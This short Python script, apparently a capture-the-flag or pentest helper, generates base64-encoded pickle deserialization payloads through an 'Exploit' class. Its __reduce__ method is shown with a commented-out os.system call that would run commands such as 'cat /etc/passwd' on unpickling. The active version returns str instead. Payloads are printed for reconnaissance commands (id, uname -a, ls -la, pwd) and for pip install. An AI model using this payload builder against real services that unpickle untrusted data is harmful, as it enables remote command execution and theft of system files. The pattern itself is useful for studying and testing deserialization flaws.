import pickle, base64, os

class Exploit(object):
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        # return (os.system, ('cat /etc/passwd',))
        return (str, (self.cmd,))

def make_payload(cmd):
    payload = pickle.dumps(Exploit(cmd))
    return base64.urlsafe_b64encode(payload).decode()

print("cat /etc/passwd:", make_payload("cat /etc/passwd"))
print("uname -a:", make_payload("uname -a"))
print("id:", make_payload("id"))
print("ls -la:", make_payload("ls -la"))
print("pwd:", make_payload("pwd"))
print("pip install pandas", make_payload("pip install pandas"))
